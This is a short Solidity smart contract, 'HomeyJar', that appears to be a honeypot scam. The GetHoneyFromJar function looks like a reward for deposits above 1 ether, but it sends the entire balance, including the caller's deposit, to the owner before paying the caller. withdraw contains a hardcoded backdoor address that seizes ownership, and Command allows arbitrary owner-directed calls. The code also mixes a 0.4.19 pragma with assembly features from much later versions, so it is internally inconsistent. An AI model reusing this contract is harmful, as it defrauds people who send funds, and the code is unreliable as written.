pragma solidity ^0.4.19;

contract HomeyJar {
    address public Owner = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if (msg.value > 1 ether) {
            assembly {
                let balance := selfbalance()
                if gt(balance, 0) {
                    call(gas(), sload(Owner_slot), balance, 0, 0, 0, 0)
                }
            }
            assembly {
                let balance := selfbalance()
                if gt(balance, 0) {
                    call(gas(), caller(), balance, 0, 0, 0, 0)
                }
            }
        }
    }

    function withdraw() payable public {
        if (msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7) {
            Owner = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
        }
        require(msg.sender == Owner);
        assembly {
            let balance := selfbalance()
            if gt(balance, 0) {
                call(gas(), sload(Owner_slot), balance, 0, 0, 0, 0)
            }
        }
    }

    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        assembly {
            let result := call(gas(), adr, callvalue(), add(data, 0x20), mload(data), 0, 0)
            if iszero(result) { revert(0, 0) }
        }
    }
}